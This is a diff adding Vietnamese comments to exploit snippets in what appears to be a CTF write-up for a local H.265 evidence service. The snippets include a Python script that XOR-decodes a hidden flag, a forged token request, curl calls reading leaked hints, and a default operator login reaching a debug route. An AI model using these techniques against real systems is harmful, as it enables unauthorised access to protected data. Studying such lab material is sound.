@@ -544,10 +544,14 @@ import hashlib
 import struct
 import zlib
 
+# Thay case_id bằng id lấy được từ /api/cases, share, manifest hoặc audit.
+# preview.h265 là file public tải từ /api/cases/<case_id>/redacted-preview.h265.
 case_id = "flag_1780132060_da66f92c"
 data = Path("preview.h265").read_bytes()
 
 def stream(seed, label):
+    # Sinh dòng byte lặp lại được từ case_id và nhãn.
+    # Backend dùng cùng công thức để XOR packet trong parameter set.
     counter = 0
     while True:
         block = hashlib.sha256(label + seed.encode() + counter.to_bytes(4, "big")).digest()
@@ -556,6 +560,7 @@ def stream(seed, label):
             yield byte
 
 def find_nals(raw):
+    # Tách luồng H.265 Annex-B bằng start code 00 00 00 01 hoặc 00 00 01.
     starts = []
     i = 0
     while i < len(raw) - 3:
@@ -570,25 +575,41 @@ def find_nals(raw):
         yield raw[start + size:end]
 
 def nal_type(nal):
+    # H.265 lưu nal_unit_type trong 6 bit giữa của byte đầu tiên.
     return (nal[0] >> 1) & 0x3F if len(nal) >= 2 else -1
 
 for nal in find_nals(data):
+    # Parameter set gồm VPS/SPS/PPS, tương ứng type 32/33/34.
     if nal_type(nal) not in (32, 33, 34):
         continue
+
+    # Bỏ 2 byte header NAL, phần còn lại là payload.
     payload = nal[2:]
+
+    # H5PSET là dấu hiệu trace bị nhét vào parameter set.
     pos = payload.find(b"H5PSET")
     if pos < 0:
         continue
+
+    # Sau H5PSET là 2 byte độ dài của packet đã XOR.
     size_pos = pos + len(b"H5PSET")
     size = struct.unpack(">H", payload[size_pos:size_pos + 2])[0]
     masked = payload[size_pos + 2:size_pos + 2 + size]
+
+    # XOR ngược bằng nhãn riêng của kênh parameter set.
     key = stream(case_id, b"h265-ad-ps-trace:")
     packet = bytes(byte ^ next(key) for byte in masked)
+
+    # Packet hợp lệ phải bắt đầu bằng H5AD.
     if packet[:4] != b"H5AD":
         continue
+
+    # Packet có dạng: H5AD || độ dài flag || flag || crc32(flag).
     flag_len = struct.unpack(">H", packet[4:6])[0]
     flag = packet[6:6 + flag_len]
     crc = struct.unpack(">I", packet[6 + flag_len:10 + flag_len])[0]
+
+    # CRC đúng thì in flag.
     if (zlib.crc32(flag) & 0xffffffff) == crc:
         print(flag.decode())
         break
@@ -619,8 +640,13 @@ POST /api/read
 ### Lệnh Khai Thác
 
 ```powershell
+# case_id lấy từ /api/cases, share, manifest hoặc audit.
 $id = "flag_1780132060_da66f92c"
+
+# Token yếu được sinh lại từ case_id bằng đúng công thức checker dùng.
 $token = python -c "import hashlib; i='$id'; print(hashlib.sha256(('h265-ad-checker-token:'+i).encode()).hexdigest()[:32])"
+
+# Gọi route hợp lệ /api/read bằng token vừa tự tính được.
 curl.exe -X POST http://127.0.0.1:8000/api/read `
   -H "Content-Type: application/json" `
   -d "{\"id\":\"$id\",\"token\":\"$token\"}"
@@ -653,6 +679,7 @@ Vì `case_id` public, attacker XOR ngược được flag.
 ### Lệnh Khai Thác
 
 ```powershell
+# Tải diagnostics public để lấy custody_hint.
 curl.exe http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/diagnostics.json
 ```
 
@@ -661,10 +688,14 @@ Sau đó giải `custody_hint`:
 ```python
 import hashlib
 
+# case_id lấy từ URL hoặc JSON response.
 case_id = "flag_1780132060_da66f92c"
+
+# hint là chuỗi hex trong trường custody_hint của diagnostics.json.
 hint = "hex_custody_hint_lay_tu_response"
 
 def stream(seed, label):
+    # Sinh lại dòng byte mà backend dùng để che custody_hint.
     counter = 0
     while True:
         block = hashlib.sha256(label + seed.encode() + counter.to_bytes(4, "big")).digest()
@@ -672,6 +703,7 @@ def stream(seed, label):
         for byte in block:
             yield byte
 
+# XOR ngược bằng nhãn diagnostics.
 key = stream(case_id, b"h265-ad-diag:")
 print(bytes(byte ^ next(key) for byte in bytes.fromhex(hint)).decode())
 ```
@@ -700,6 +732,8 @@ Attacker không cần đọc body ảnh. Chỉ cần lấy header `X-H265-Custod
 ### Lệnh Khai Thác
 
 ```powershell
+# Chỉ cần xem header, không cần tải body ảnh.
+# Header X-H265-Custody-Hint chứa dữ liệu đã XOR.
 curl.exe -I http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/thumbnail.jpg
 ```
 
@@ -734,10 +768,12 @@ Route debug:
 ### Lệnh Khai Thác
 
 ```powershell
+# Đăng nhập bằng tài khoản operator mặc định và lưu cookie phiên vào cookie.txt.
 curl.exe -c cookie.txt -X POST http://127.0.0.1:8000/api/operator/login `
   -H "Content-Type: application/json" `
   -d "{\"username\":\"triage\",\"password\":\"triage-2026\"}"
 
+# Dùng cookie operator để gọi route debug marker của case.
 curl.exe -b cookie.txt http://127.0.0.1:8000/api/operator/cases/flag_1780132060_da66f92c/debug-marker
 ```
 
